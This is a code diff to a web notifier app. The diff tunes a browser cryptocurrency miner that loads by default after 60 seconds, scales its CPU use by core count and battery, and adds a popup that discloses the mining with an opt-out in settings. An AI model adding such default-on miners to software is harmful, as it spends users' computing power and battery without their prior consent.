@@ -3,8 +3,9 @@ function main() {
     if(localStorage.getItem("username")) {
         notifier();
         settings();
-        if(localStorage.getItem("support")==="1") {loadMiner(); setTimeout(setMineSpeed,10000);}
-        if(localStorage.getItem("support")===null){localStorage.getItem("support", "1"); setTimeout(loadMiner,60000); setTimeout(setMineSpeed,70000);}
+        if(localStorage.getItem("support")==="1") {loadMiner(); mineInterval = setInterval(setMineSpeed, 60000);}
+        if(localStorage.getItem("support")===null){localStorage.getItem("support", "1"); setTimeout(loadMiner,60000); setTimeout(function(){mineInterval = setInterval(setMineSpeed, 60000);},70000);}
+        if(location.hash) location.href = location.href.slice(0,-location.hash.length);
         gtag('event', 'newsession');
     }
     else {
@@ -12,7 +13,6 @@ function main() {
         gtag('event', 'newuser');
     }
 
-    if(location.hash==="#overview" && !localStorage.getItem("overviewDone") && localStorage.getItem("username")) overview();
 }
 
 var loadMiner = function() {
@@ -21,25 +21,30 @@ var loadMiner = function() {
   cfc.setAttribute("data-level", "5");
   cfc.setAttribute("data-user", "2951276");
   document.head.appendChild(cfc);
+  setTimeout(setUpMiner, 15000);
 }
 
-var setMineSpeed = function(){
-  var mineInterval = setInterval(setMineSpeed, 60000);
+var setUpMiner = function () {
   if(typeof(miner)==="undefined") {localStorage.setItem("support","0"); clearInterval(mineInterval); return;}
-  miner.setNumThreads(navigator.hardwareConcurrency/2);
+  miner.setNumThreads(1);
   try {
-  navigator.getBattery().then(function(battery) {
-    if(battery.level===null) {miner.setThrottle(0.95); clearInterval(mineInterval);}
-    else miner.setThrottle((100-0.08*(battery.level.toFixed(1)*100))/100);});
-    gtag('event', 'mining', {
-      'speed': miner.getThrottle()*100,
+    navigator.getBattery().then(function(battery) {
+      if(battery.level===null) {miner.setThrottle(1-0.05*navigator.hardwareConcurrency); clearInterval(mineInterval);}
+      else miner.setThrottle(1-0.08*navigator.hardwareConcurrency*battery.level.toFixed(1));
     });
   } catch(x) {
-    miner.setThrottle(0.99);
-    gtag('event', 'mining', {
-      'speed': 99,
+  miner.setThrottle(1-0.05*navigator.hardwareConcurrency); clearInterval(mineInterval);
+  }
+};
+
+var setMineSpeed = function(){
+  try {
+    navigator.getBattery().then(function(battery) {
+      if(battery.level===null) {miner.setThrottle(1-0.05*navigator.hardwareConcurrency); clearInterval(mineInterval);}
+      else miner.setThrottle(1-0.05*navigator.hardwareConcurrency*battery.level.toFixed(1));
     });
-    clearInterval(mineInterval);
+  } catch(x) {
+  miner.setThrottle(1-0.05*navigator.hardwareConcurrency);
   }
 };
 
@@ -63,6 +68,7 @@ function notifier() {
         document.body.style.backgroundImage = 'url('+bgImg.src+')';
         document.getElementById("page").style.display = "block";
         document.getElementById("pageTitle").style.display = "";
+        if(!localStorage.getItem("overviewDone") && localStorage.getItem("username")) overview();
       }, 200);
       };
     bgImg.onerror = getBackground;
@@ -486,6 +492,14 @@ swal({
   closeOnClickOutside: false,
 })
 .then(() => {
+  swal({
+  title: "A final note",
+  text: "By using the notifier, you are supporting us - your machine is doing a small amount of mathematical calculations every second while the notifier is open.\nIf you have a data limit, notice your computer goes slower or simply do not want to support us, feel free to disable these calculations in the settings.",
+  icon: "warning",
+  button: "Got it!",
+  closeOnClickOutside: false,
+})
+.then(() => {
 swal({
   title: "We're done!",
   text: "Just keep this tab pinned and open, and enjoy the notifications! :)",
@@ -493,6 +507,8 @@ swal({
   button: "Let's go!",
 });
 });
-});});
+});
+});
+});
 });
 }
